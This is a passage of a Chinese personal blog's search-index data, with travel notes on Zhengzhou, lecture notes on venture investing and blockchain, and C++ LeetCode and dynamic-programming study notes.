，也必须等店里的人吃尽兴了才能进入。包子的售价也与其他店不同，蟹黄包买的越多反而越贵，1只10元，2只24元，3只42元，4只64元，并且每人限购4只。点完餐后在店中大概需要等到五到十分钟，因为所有的食物都是现场制作的。店里的小菜非常好吃，秘制蚕豆非常酥软，汤包和混沌更不必说，鲜味十足，混沌更是非常劲道，虽然相比于郑州的其他美食价格着实不菲，但确实是物有所值。 阿春家全蟹小笼包 大玉米楼夜景 夜晚的大玉米楼格外耀眼，如意湖湖水清冽，立交桥上满是特意驱车来拍摄大玉米楼的人们。即使是灯火通明，郑州的CBD一如其他位置一样的宁静，如意湖边游人如织，讲述着各自的故事。坐在湖边的楼梯上便再也不愿起身离去，沉浸在美丽的夜景与一个个迷人的故事之中，若是生命定格于此，大概也没有遗憾了吧。 大玉米楼 10.5蔡记蒸饺 早上9点多钟才起床，收拾好东西，退了房，便向下一家美食进发了。 郑州美食有三宝:蔡记蒸饺，合记烩面，葛记焖饼，这三家店都是郑州的老古董了。作为早餐，选择了蔡记蒸饺，出了地铁口，过个马路便能看见。不得不说，这家店比我想的要大得多，和昨日的阿春家全蟹小笼包风格完全不同，本以为郑州的美食都藏在小巷里，小巧而精致，但这家店更像是一家餐厅，不过环境确实非常好，铮铮琵琶声绕着古树飘进人的耳膜。 大概等了十多分钟饺子才上桌，因为听说是现包现煮的，所以也可以理解。饺子上桌后又让人吃了一惊，分量真的非常足，一个人，一笼蒸饺，一碗汤，就足够了，味道也非常赞! 蔡记蒸饺 新华书店 吃过蒸饺，已经近十一点了，遂搭乘地铁去往了期望已久的新华书店(美盛店)。由于事先看过照片，店里如画一样的美景并没有令我太过惊异，只是店里的孩子很多，过于嘈杂令人不免有些失望，毕竟是怀着朝圣的心情来到这里。但它只是一家书店，甚至有很大一部分书柜被教辅书籍占领，也就不能用圣殿的要求来苛责它了。书店真的是个神奇的地方，即便是有许许多多的烦心事，在这里坐下，翻开书，也会忘得一干二净了。 新华书店 下午三点，依依不舍地离开新华书店，去往河南省博物馆，恰好赶上了4点的华夏古乐音乐会。25分钟的古乐器表演荡涤了人一天的疲惫，主持人对于诗词婉转的把握恰到好处，十分应景。之后逛了古文物展，虽然对应人群及其抗拒，但也许是因为心静，这一次竟随着人群听导游一路说了下来，有一种如沐春风的感觉。其实对于博物馆并没有太多的情怀，每次或看或听，马上就会忘掉，但总觉得在博物馆里时间是静止的，有些东西，无论过了多久，都不会改变的。 河南省博物馆 待博物馆闭馆后，又乘地铁回到二七广场，找到了一家叶佬传承，第一次在广式糖水店吃晚餐，感觉这是广州人吃早茶的地方，店里卖的都是饮品，主食就吃了一碗港式乌冬面，并没有吃饱，不过体验还是非常棒的。 叶佬传承 吃过晚饭就去了郑州大学南校区，可能是一天太过奔波劳累，在郑大并没有逛太久，从一个小门进，另一个小门出。实话说郑大的南校区不免令人有些失望，除了主干道以为四处一片漆黑，昏黄的灯光在黑夜里摇曳，路上基本没有见到学生，倒是很多老年人在散步，可能是来错了地方吧，总觉得这里更像是一个小区而并非大学。 归途 一天的负重来回奔波着实劳累，所以早早地就来到了火车站等候上车，此次旅程也就宣告结束了。无论如何郑州这座城市还是给我留下了非常好的印象，郑州，我们还会再相聚。 郑州印象 郑州人在生活的方方面面真的很守规矩，但超喜欢中国式过马路 郑州的生活十分规律，没有夜生活，日出而作，日落而息 郑州的公园很多，大大小小可能有几十个 郑州的天气真的很干燥，可能是因为如此公园和学校都有湖 郑州人对大学有一种敬仰，以大学命名的地铁站就有十多个 郑州的回民有自己的自治区，有自己的政府，甚至有自己的学校 但在回民管制区和其他区的交接处，地铁站的安检会格外严格","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"}]},{"title":"投资人都在想什么","slug":"投资人都在想什么","date":"2018-09-22T02:05:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/09/22/投资人都在想什么/","link":"","permalink":"https://liuyi12138.github.io/2018/09/22/投资人都在想什么/","excerpt":"点石创校第一课，杨蓬经理讲述风险投资本质","text":"点石创校第一课，杨蓬经理讲述风险投资本质 企业，公司与投资公司与企业的关系 公司是企业的一种组织形式 企业包含公司，企业还有其他组织形式 公司不属于公司的法人而属于股东 投资就是投人 PE:私募股权投资 IPO:首次公开发行股票(上市) Pre-IPO:投资于上市之前 投资基金四部曲: 募+投+管+退 VC:风险投资/创业投资 用美元的投资叫风险投资 在国内用人民币的投资叫创业投资 风险投资和创业投资美元本质区别，只是在理念和投资偏好上有微小区别 风险投资的本质是通过投资的方式获得一家公司的股权然后高价出售 各类投资时间图 基金 在投资人和管理人之间的管理财务的一种组织方式叫基金 投资人把钱存入基金，管理层使用基金里的钱进行商业活动(投资) 公司形成流程： 投资人召开股东会 股东会推荐董事会(董事长) 董事会选择总经理 总经理组织管理层 投资人可通过公募和私募召集(私募 != 不合法) 私募股权投资基金:公司制，有限合伙制，信托制 有限合伙制 公司制是资合，合伙制是人合，有限合伙制是资合+人合 有限合伙企业有两种合伙人 普通合伙人(GP):公司的管理与决策 有限合伙人(LP):出钱+收钱 普通合伙人组成投资委员会 GP可出让部分票给LP 在公司制中股东承担责任，在有限合伙制中，普通合伙人承担无线连带责任 公司 股东的出资额所占注册基金的比例称为股权比例(有限责任公司) 当有限责任公司转为股份公司时，将净资产折合为股份，此时增加合伙人则称作扩股 股权比例可以被稀释，股份不能被稀释 在中国同股同权 增资:增加注册资本 转股:老股东转让股份 扩股:股份公司融资 议价:购买出资额，议价购买部分股权比例时，通过比例可算出估值 完整融资过程 投资人都在想什么Q:你有什么想法与你身边的其他人完全不一样 早期投资的关键在于你与你的同行有什么不一样的地方 第一步要了解你的同行在做什么 Q:投资人是做什么的 投资的核心在于追求汇报 投资人更看重的是企业的成长性 Q:商业计划书到底是什么 做商业计划书的目的:通过分析证明自己的价值 商业计划书如同一道证明题，所以最注重的是逻辑，反而结果并不是很重要 Q:什么样的项目是好项目 投资的两种方式:投人/投赛道 早期投资人能拿到的信息量极少，所以会通过逻辑来判断项目 投资人逻辑:如果你连A都做不好，那么你怎么能做好B 作为创业者，注意细节，一份好的PPT 好的商业计划书很重要 商业计划书中的商业逻辑 商业计划书需要包含的内容 公司 公司概况:公司的介绍，定位，战略 公司在什么行业里面(希望看到该公司对这个行业的理解，现状，发展) 切勿讲行业的痛点，行业是没有痛点的，只有在这个现状下用户的痛点，而用户组成市场，痛点是有需求没有被满足，有需求就有市场 市场 市场的组成结构，市场大小，市场趋势 对行业的看法要有自己的观点以及分析过程 产品 公司生产的产品，具体，不要谈平台(从工具到流量到平台，大部分公司没有做上层的能力) 产品满足了用户的什么需求，以及有什么特点 技术 技术不是专利，专利是一种方法的使用权利，而技术要求有门槛，我能做，别人不能 技术不是对用户的，技术是相对于同行来说的，技术提供的是一种竞争力 你用的技术是什么，你的技术有什么特点，通过这些技术，你的产品有什么特点 优势 产品优势和技术优势 优势是比出来的，通过强弱和差异化等方面寻找自己的优势 策略 如何接触用户，卖出产品 市场推进 团队组成 团队是执行前面所有想法的基础 需要多少钱 融到这些钱之后能实现怎么样的经营目标 Q:你是千里马吗？你有多大的草原用来奔驰 你所在的市场是不是有足够大的容量让你去发展 市场: 不需要用数据佐证大小的市场是好市场，但需要用事实去证明份额 项目着眼点 用户与需求 用户 用户与客户的区别(教育行业) 用户特征如何描述: 准确，细致 需求 刚性需求的定义 蓝海市场的定义:分析用户没有被满足的需求 产品 好产品的特点 让用户尖叫的产品:有鲜明的特点 少即是多:产品功能少，但需要做到极致 极致与不完美:产品要做出差异化，做出特点 创业者的格局 高度: 分析出发展趋势 广度: 能看到尽量多同行在做什么 深度: 是否真的了解这个行业，跟多少同行有交流，了解多少同行的经营状态 商业模式的本质是通过某种方法，制造某种产品，卖给某些人来赚钱 估值 商业计划-&gt;资金-&gt;经营目标-&gt;价值实现 这一切的重点在于团队，一个有经验的团队 怎么与投资人交流 信心: 让投资人觉得在这个行业你比他强 热爱","categories":[{"name":"点石创校","slug":"点石创校","permalink":"https://liuyi12138.github.io/categories/点石创校/"}],"tags":[{"name":"点石创校","slug":"点石创校","permalink":"https://liuyi12138.github.io/tags/点石创校/"}]},{"title":"点石37期项目打磨","slug":"点石项目打磨","date":"2018-09-22T01:03:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/09/22/点石项目打磨/","link":"","permalink":"https://liuyi12138.github.io/2018/09/22/点石项目打磨/","excerpt":"第37期创业红娘相亲会项目打磨","text":"第37期创业红娘相亲会项目打磨 三三联动医养融合系统 准备PPT和视频注意尺寸 1min视频 没有解释什么是三三联动(可以用画面表示) 字幕加背景条，不然看不清 背景杂音太大 10s介绍项目 4字/s 标准 4min PPT 4min 8页PPT，2页/min 首页PPT减少信息量，突出重点 通过问答形式展现，7问7答 PPT一页4行文字，可外加图表，至少出现三个关键数据 PPT外接图表信息量不宜过大 用动画连接PPT逻辑 空喊口号，没有展现自己的技术门槛 名师网 K12：教育类专用名词，是学前教育到高中教育的缩写，现普遍被用来指代基础教育1min视频 没有画外音，用强音乐刺激观众 10s介绍项目 普通话不标准，放慢讲话速度 不能用引起歧义的词(例如:包装) 4min PPT 缺乏讲PPt的技巧，就少说话，减少PPT字数 PPT使用动画 字数多时提取关键词放大 反复强调项目特点","categories":[{"name":"点石创校","slug":"点石创校","permalink":"https://liuyi12138.github.io/categories/点石创校/"}],"tags":[{"name":"点石创校","slug":"点石创校","permalink":"https://liuyi12138.github.io/tags/点石创校/"}]},{"title":"大数据及人工智能技术在贝贝","slug":"大数据及人工智能技术在贝贝","date":"2018-09-19T12:56:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/09/19/大数据及人工智能技术在贝贝/","link":"","permalink":"https://liuyi12138.github.io/2018/09/19/大数据及人工智能技术在贝贝/","excerpt":"Dian团队283号队员周黄玲的分享","text":"Dian团队283号队员周黄玲的分享 人工智能的应用 计算智能: 搜索，推荐，广告，智能运营 感知智能：图像处理 认知智能：文本处理，自然语言处理 应用举例:搜索 问题分析: 搜索：输入错误，输入模糊，需求多样性 响应:数据量大，精准匹配，精细化排序，去重 应对方案: 输入前引导：个性化搜索，搜索记录 输入中引导：关键词推荐，类目直达 搜索前分析：分词，类目预测，意图分析 搜索引擎：排序 结果聚合 搜索关键技术 相关性匹配 转化率预估 排序学习：预估转化率决定预估顺序 个性化","categories":[{"name":"Dian团队分享","slug":"Dian团队分享","permalink":"https://liuyi12138.github.io/categories/Dian团队分享/"}],"tags":[{"name":"Dian","slug":"Dian","permalink":"https://liuyi12138.github.io/tags/Dian/"},{"name":"大数据","slug":"大数据","permalink":"https://liuyi12138.github.io/tags/大数据/"}]},{"title":"从学生到团队队员到职场人的三个阶段","slug":"从学生到团队队员到职场人的三个阶段","date":"2018-09-19T12:12:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/09/19/从学生到团队队员到职场人的三个阶段/","link":"","permalink":"https://liuyi12138.github.io/2018/09/19/从学生到团队队员到职场人的三个阶段/","excerpt":"Dian团队360号队员龚小聪的分享——Dian团队和我","text":"Dian团队360号队员龚小聪的分享——Dian团队和我 在信息爆炸中保持独立思考和独立人格区块链技术 区块链的基本技术很简单，更好的理解方式应该是查阅第一手资料 mark一手区块链白皮书人工智能 人工智能的精髓在于调参?(手动滑稽)社会问题 对于社会问题要有自己的思考，不能一昧相信他人的分享 个人感想 安利一本书 《创新者的窘境》 哪些事情是你回过头来看才发现别有深意的","categories":[{"name":"Dian团队分享","slug":"Dian团队分享","permalink":"https://liuyi12138.github.io/categories/Dian团队分享/"}],"tags":[{"name":"Dian","slug":"Dian","permalink":"https://liuyi12138.github.io/tags/Dian/"}]},{"title":"达闼科技区块链技术分享","slug":"达闼科技区块链技术分享","date":"2018-09-19T12:07:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2018/09/19/达闼科技区块链技术分享/","link":"","permalink":"https://liuyi12138.github.io/2018/09/19/达闼科技区块链技术分享/","excerpt":"区块链的简单介绍，一些落地问题以及达闼科技的应用","text":"区块链的简单介绍，一些落地问题以及达闼科技的应用 达闼区块链技术应用:安全的云端机器人网络 区块链是什么 将互联网由传递信息改变为传递价值(保证信息的可靠性) 区块链的运营模式:分布式储存数据 区块链的发展:Blockchain1.0(比特币),Blockchain2.0(以太坊(支持智能合约)) 智能合约: 传统意义上的合约:有法律效益,一式多份,不允许更改 智能合约的特点:由于区块链上的信息是透明的，而且信息不可更改，所以智能合约可以保障双方的信用问题 区块链的落地问题效率低 区块链的典型特点是去中心化，其修改数据时需要各账单对同一节点的数据进行更改，所以相比于中心化的数据处理机制，区块链的效率是很低的。 虽然理论上区块链技术可以解决支付问题并取代现有支付机制，但由于效率与成本问题，并不能很好的落地 隐私保护 区块链上的信息都是透明公开且不可更改的，这保证了区块链的可靠性，也就决定了区块链在隐私保护方面的弱势 区块链并不是不能保障隐私，只是效率极低，很难被实际应用 达闼科技的区块链落地 定位:身份认证系统(少写多读，效率较高) 优点:构建VBN网络，使信息在公网不可见，保障了信息的安全性 应用场景:机器人的身份标识，机器与机器之间信任机制(去第三方平台的信任机制)","categories":[{"name":"Dian团队分享","slug":"Dian团队分享","permalink":"https://liuyi12138.github.io/categories/Dian团队分享/"}],"tags":[{"name":"Dian","slug":"Dian","permalink":"https://liuyi12138.github.io/tags/Dian/"},{"name":"区块链","slug":"区块链","permalink":"https://liuyi12138.github.io/tags/区块链/"}]},{"title":"算法学习笔记之动态规划","slug":"算法学习笔记之动态规划","date":"2018-09-05T13:26:40.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2018/09/05/算法学习笔记之动态规划/","link":"","permalink":"https://liuyi12138.github.io/2018/09/05/算法学习笔记之动态规划/","excerpt":"动态规划适用于子问题不是独立的情况，也就是各子问题包含公共的子子问题。","text":"动态规划适用于子问题不是独立的情况，也就是各子问题包含公共的子子问题。 动态规划的适用范围 如果要求一个问题的最优解（通常是最大值或者最小值），而且该问题能够分解成若干个子问题，并且小问题之间也存在重叠的子问题，则考虑采用动态规划 无后效性：下一时刻的状态只与当前状态有关，而和当前状态之前的状态无关，当前状态是对以往决策的总结 动态规划的重点 递归方程+边界条件 动态规划算法的两种设计 自底向上(备忘录法)：从大范围递推计算到小范围，不断保存中间结果，避免重复计算 自顶向下(递推法)：从小范围递推计算到大范围 经典问题分析 Leetcode爬楼梯问题 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？ 递推公式：DP[i]=DP[i-1]+DP[i-2] 边界条件：DP[1]=1 DP[2]=2 递推法 12345678class Solution &#123;public: int climbStairs(int n) &#123; if (n == 1) return 1; if (n == 2) return 2; return climbStairs(n-1) + climbStairs(n-2); &#125;&#125;; 备忘录法 12345678910111213class Solution &#123;public: int climbStairs(int n) &#123; if (n == 1) return 1; if (n == 2) return 2; int results[n+1]; results[1] = 1; results[2] = 2; for (int i=3; i&lt;=n; ++i) results[i] = results[i-1] + results[i-2]; return results[n] ; &#125;&#125;; 算法分析 不难看出备忘录法的时间复杂度是低于递推法的,其原因就在于递推法中计算了很多重复子问题，比如在此题中，当递归n-1和n-2的值时，n-1以下的部分就被计算了两次，浪费了时间，而在备忘录法中，保存了中间状态，就不用多次计算了。 分治法与动态规划 按理来说分治法与动态规划的职能不同，分治法的子问题应当相互独立，而动态规划的子问题包含公共的子子问题，但有些问题两种方法都能解决。 分治法将分解后的子问题看成相互独立的，通过用递归来做。 动态规划将分解后的子问题理解为相互间有联系,有重叠部分，需要记忆，通常用迭代来做 最大子数组问题 分治法：最大和子数组必定是左右两个子数组中的最大和子数组和跨越中间的最大和子数组中的一个 123456789101112131415161718192021222324252627282930313233class Solution &#123;public: int maxSubArray(vector&lt;int&gt;&amp; nums) &#123; if (nums.size() == 1) return nums[0]; int mid = nums.size()/2; vector&lt;int&gt; left(nums.begin(),nums.begin()+mid); vector&lt;int&gt; right(nums.begin()+mid,nums.end()); int leftMax = maxSubArray(left); int rightMax = maxSubArray(right); int midMax = searchMidMax(nums,mid); return max(leftMax,max(rightMax,midMax)); &#125; int searchMidMax(vector&lt;int&gt;&amp; nums,int mid) &#123; if (nums.size() == 1) return nums[0]; int maxl = nums[mid]; int maxr = nums[mid]; int sum = 0; for (int i = mid; i&gt;=0; --i) &#123; sum += nums[i]; if (sum &gt; maxl) maxl = sum; &#125; sum = 0; for (int j = mid; j&lt;nums.size(); ++j) &#123; sum += nums[j]; if (sum &gt; maxr) maxr = sum; &#125; return (maxr+maxl-nums[mid]); &#125;&#125;; 动态规划：遍历过程中保存最大值位置 MS[i] = max {MS[i-1], A[i]}. 12345678910111213141516171819202122232425262728293031int FindMaxSubarray(int array[], int length)&#123; int start = 0, end = 0; //记录最大子数组的起始位置（在数组中的下标） int MaxSumSub; //最大子数组的值 int* dp = new int[length]; //动态规划记录 dp[0] = array[0]; //初始为第一个数 MaxSumSub = dp[0]; //最大值初始为第一个数 int temp = 0; // for(int i = 1; i &lt; length; i++) &#123; if(dp[i - 1] &lt;= 0) //前面的&lt;0，直接丢弃 &#123; dp[i] = array[i]; temp = i; //记录起始为止 &#125; else dp[i] = array[i] + dp[i - 1]; //往后求和 if(dp[i] &gt; MaxSumSub) //找到到i为止的最大子数组 &#123; MaxSumSub = dp[i]; //最大... start = temp; //标记起始 end = i; //标记此时的结束位置 &#125; &#125; return MaxSumSub; &#125; 从分治法的角度来看，数组被划分成了两部分，子问题相互独立 从动态规划的角度来看，下一个子问题中包含了子子问题，也可以说是有重叠子问题 以此可以看出从不同方向来分析同一问题，会有不同的结果 另一方面，分治法的第二种拆分方法(分治法实践)从每次进行一次不对等分配的方向来看，确实符合分治法的思路，从每次递归找到一个更小的子问题的方向来看，又是动态规划。 所以分治法和动态规划的界限也没有那么明显，或者说，分治法是一种方法，而动态规划是一种思路，两者本来就不矛盾。 感想不得不说 虽然抽象后的动态规划进行求解的思路并不复杂，但具体的形式仿佛可以千变万化，和其他算法之间也有着千丝万缕的关系,不进行实践很难有进一步的认知，所以又到了刷Leetcode的时间了2333","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/tags/算法/"}]},{"title":"C++刷Leetcode笔记之 65. Valid Number","slug":"C++刷Leetcode笔记之 65. Valid Number","date":"2018-08-29T12:56:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/29/C++刷Leetcode笔记之 65. Valid Number/","link":"","permalink":"https://liuyi12138.github.io/2018/08/29/C++刷Leetcode笔记之 65. Valid Number/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 又AC的第一个HARD题，hhhh Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 又AC的第一个HARD题，hhhh Leetcode传送门 Valid Number [Difficulty: Hard]题目 Validate if a given string is numeric. Some examples: “0” =&gt; true “ 0.1 “ =&gt; true “abc” =&gt; false “1 a” =&gt; false “2e10” =&gt; true Note: It is intended for the problem statement to be ambiguous. You should gather all requirements up front before implementing one. 12345class Solution &#123;public: bool isNumber(string s) &#123;&#125;; 我的思路 思路都在注释里，做这个题的时候心里是mmp的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class Solution &#123;public: bool isNumber(string s) &#123; int max = s.size(); int flag = 0; //判断小数点是否存在 int numExitRef = 0; //判断小数点前是否有数字 int unmExitNext = 0; //判断小数点后是否有数字 int numEnd = 0; //判断是否到数字结尾 int eExit = 0; //判断e是否存在 int eNumRef = 0; //判断e前面是否有数字 int eNumNext = 0; //判断e后面是否有数字 int symbol = 0; //判断是否有符号 for (int i = 0; i&lt;max; ++i) &#123; if (!symbol &amp;&amp; !numExitRef &amp;&amp; !flag &amp;&amp; s[i] == ' ') continue; //判断是否为数字开始前的空格 else if (s[i] == '-' || s[i] == '+') &#123; if (flag || numExitRef || symbol) //如果有小数点，前面存在数字，已存在符号则判为false return false; else symbol = 1; //如果没有上述情况，则判定已有符号 &#125; else if (s[i] == '.' &amp;&amp; !flag &amp;&amp; !eExit) &#123; //如果此字符为小数点且前面没有小数点而且e不存在 if (numEnd) //如过到数字结尾了，则判false return false; flag = 1; //判定已有小数点 &#125; else if (eNumRef &amp;&amp; s[i] == 'e' &amp;&amp; !eExit) &#123; //如果e前面有数字且e不存在 eExit = 1; //判定e存在 unmExitNext = 0; //由于e后和e前可以当做两个数字，则将这些值都置0 numExitRef = 0; symbol = 0; flag = 0; &#125; else if (s[i] &lt; '0' || s[i] &gt; '9') &#123; //如果此字符不为以上特殊符号和数字 if (s[i] == ' ') //如果此字符为空 numEnd = 1; //判定已到数字结尾 else return false; //否则判为false &#125; else &#123; //如果此字符为数字 if (flag) unmExitNext = 1; //判定是小数点前还是小数点后 else numExitRef = 1; if (eExit) eNumNext = 1; //判定是e前还是e后 else eNumRef = 1; if (numEnd) //如果已经到数字末尾了则判为false return false; &#125; &#125; if (eExit &amp;&amp; !eNumNext) return false; //如果e存在且e后没有数字，判为false else if (numExitRef || unmExitNext) return true; //如果小数点前后有数字，判为true return false; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 57. Insert Interval","slug":"C++刷Leetcode笔记之 57. Insert Interval","date":"2018-08-29T09:56:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/29/C++刷Leetcode笔记之 57. Insert Interval/","link":"","permalink":"https://liuyi12138.github.io/2018/08/29/C++刷Leetcode笔记之 57. Insert Interval/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 AC的第一个HARD题，感觉还没有127难23333，可能是做了56的原因吧 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 AC的第一个HARD题，感觉还没有127难23333，可能是做了56的原因吧 Leetcode传送门 Insert Interval [Difficulty: Hard]题目 Given a set of non-overlapping intervals, insert a new interval into the intervals (merge if necessary). You may assume that the intervals were initially sorted according to their start times. 123456Input: intervals = [[1,3],[6,9]], newInterval = [2,5]Output: [[1,5],[6,9]]Input: intervals = [[1,2],[3,5],[6,7],[8,10],[12,16]], newInterval = [4,8]Output: [[1,2],[3,10],[12,16]]Explanation: Because the new interval [4,8] overlaps with [3,5],[6,7],[8,10]. 1234567891011121314/** * Definition for an interval. * struct Interval &#123; * int start; * int end; * Interval() : start(0), end(0) &#123;&#125; * Interval(int s, int e) : start(s), end(e) &#123;&#125; * &#125;; */class Solution &#123;public: vector&lt;Interval&gt; insert(vector&lt;Interval&gt;&amp; intervals, Interval newInterval) &#123;&#125;; 我的思路1.insert+56 第一次AC就是直接insert一下,然后就把56的代码拿上去了233332.选择性insert+56 避免了sort，选择性insert，通过判断将其insert到正确的位置，顺便从插入位置开始循环，减少循环次数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** * Definition for an interval. * struct Interval &#123; * int start; * int end; * Interval() : start(0), end(0) &#123;&#125; * Interval(int s, int e) : start(s), end(e) &#123;&#125; * &#125;; */class Solution &#123;public: vector&lt;Interval&gt; insert(vector&lt;Interval&gt;&amp; intervals, Interval newInterval) &#123; int max = intervals.size(); if (max == 0) &#123; intervals.push_back(newInterval); return intervals; &#125; int flag = 0; if (newInterval.start &lt;= intervals[0].start) &#123; intervals.insert(intervals.begin(), 1, newInterval); flag = 1; &#125; if (newInterval.start &gt; intervals[max-1].start) &#123; intervals.push_back(newInterval); flag = 1; &#125; vector&lt;Interval&gt; result; for (int i = 0; i&lt;max; ++i) &#123; if (flag || (intervals[i].start &lt; newInterval.start &amp;&amp; intervals[i+1].start &gt;= newInterval.start)) &#123; if (!flag) intervals.insert(intervals.begin()+i+1, 1, newInterval); int mstart = intervals[i].start, mend = intervals[i].end; for (int j = i+1; j&lt;max+1; ++j) &#123; if(intervals[j].start &gt; mend) &#123; result.push_back(Interval(mstart, mend)); mstart = intervals[j].start; mend = intervals[j].end; &#125; else mend = intervals[j].end &gt; mend ? intervals[j].end : mend; &#125; result.push_back(Interval(mstart, mend)); return result; &#125; result.push_back(intervals[i]); &#125; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 56. Merge Intervals","slug":"C++刷Leetcode笔记之 56. Merge Intervals","date":"2018-08-27T12:56:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/27/C++刷Leetcode笔记之 56. Merge Intervals/","link":"","permalink":"https://liuyi12138.github.io/2018/08/27/C++刷Leetcode笔记之 56. Merge Intervals/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 貌似刷题指南上的难度为Hard，就留到了后面，然后五次提交就AC了，还以为自己变强了23333 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 貌似刷题指南上的难度为Hard，就留到了后面，然后五次提交就AC了，还以为自己变强了23333 Leetcode传送门 Merge Intervals [Difficulty: Medium]题目 Given a collection of intervals, merge all overlapping intervals.12345678Input: [[1,3],[2,6],[8,10],[15,18]]Output: [[1,6],[8,10],[15,18]]Explanation: Since intervals [1,3] and [2,6] overlaps, merge them into [1,6].Input: [[1,4],[4,5]]Output: [[1,5]]Explanation: Intervals [1,4] and [4,5] are considerred overlapping. 123456789101112131415/** * Definition for an interval. * struct Interval &#123; * int start; * int end; * Interval() : start(0), end(0) &#123;&#125; * Interval(int s, int e) : start(s), end(e) &#123;&#125; * &#125;; */class Solution &#123;public: vector&lt;Interval&gt; merge(vector&lt;Interval&gt;&amp; intervals) &#123; &#125;&#125;; 我的思路 虽然范例里面是正序的，第一反应还是排序，果然是警觉了不少呢 然后主要就是遍历，然后比对了，没什么特别之处，就是最后结果不算很好123456789101112131415161718192021222324252627282930313233343536/** * Definition for an interval. * struct Interval &#123; * int start; * int end; * Interval() : start(0), end(0) &#123;&#125; * Interval(int s, int e) : start(s), end(e) &#123;&#125; * &#125;; */class Solution &#123;public: vector&lt;Interval&gt; merge(vector&lt;Interval&gt;&amp; intervals) &#123; int max = intervals.size(); if (max &lt;= 1) return intervals; sort(intervals.begin(),intervals.end(),sortFunction); vector&lt;Interval&gt;::iterator iter,iterNext; iter = intervals.begin(); iterNext = iter; iterNext++; while (iterNext != intervals.end()) &#123; if (iter-&gt;end &gt;= iterNext-&gt;start) &#123; iter-&gt;end = iterNext-&gt;end &gt; iter-&gt;end ? iterNext-&gt;end : iter-&gt;end; intervals.erase(iterNext); &#125; else &#123; iter++; iterNext++; &#125; &#125; return intervals; &#125; static bool sortFunction(Interval&amp; interval1 ,Interval&amp; interval2) &#123; return (interval1.start &lt; interval2.start); &#125;&#125;; 参考思路 差别在于我用了迭代器，而别人的循环就比较轻便，而且少了删除元素的操作12345678910111213141516171819202122232425262728293031323334/** * Definition for an interval. * struct Interval &#123; * int start; * int end; * Interval() : start(0), end(0) &#123;&#125; * Interval(int s, int e) : start(s), end(e) &#123;&#125; * &#125;; */class Solution &#123;public: static bool compare(Interval a, Interval b) &#123; return a.start &lt; b.start; &#125; vector&lt;Interval&gt; merge(vector&lt;Interval&gt;&amp; intervals) &#123; if(intervals.size() &lt; 2) return intervals; sort(intervals.begin(), intervals.end(), compare); vector&lt;Interval&gt; result; int start = intervals[0].start, end = intervals[0].end; for(int i=1; i&lt;intervals.size(); i++) &#123; if(intervals[i].start &gt; end) &#123; result.push_back(Interval(start, end)); start = intervals[i].start; end = intervals[i].end; &#125; else end = max(intervals[i].end, end); &#125; result.push_back(Interval(start, end)); return result; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://liuyi12138.github.io/categories/算法/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"Leetcode","slug":"Leetcode","permalink":"https://liuyi12138.github.io/tags/Leetcode/"}]},{"title":"C++刷Leetcode笔记之 127. Word Ladder","slug":"C++刷Leetcode笔记之 127. Word Ladder","date":"2018-08-27T10:11:04.000Z","updated":"2021-02-23T06:34:31.894Z","comments":true,"path":"2018/08/27/C++刷Leetcode笔记之 127. Word Ladder/","link":"","permalink":"https://liuyi12138.github.io/2018/08/27/C++刷Leetcode笔记之 127. Word Ladder/","excerpt":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 至今遇到的最难的题之一，有一种找最短路径的感觉 Leetcode传送门","text":"在深信服组期间学习了C++的使用方法，就打算通过刷Leetcode来提高自己的算法能力以及对C++的掌握能力 至今遇到的最难的题之一，有一种找最短路径的感觉 Leetcode传送门 Word Ladder [Difficulty: Medium] Given two words (beginWord and endWord), and a dictionary’s word list, find the length of shortest transformation sequence from beginWord to endWord, such that: Only one letter can be changed at a time. Each transformed word must exist in the word list. Note that beginWord is not a transformed word. Note: Return 0 if there is no such transformation sequence. All words have the same length. All words contain only lowercase alphabetic characters. You may assume no duplicates in the word 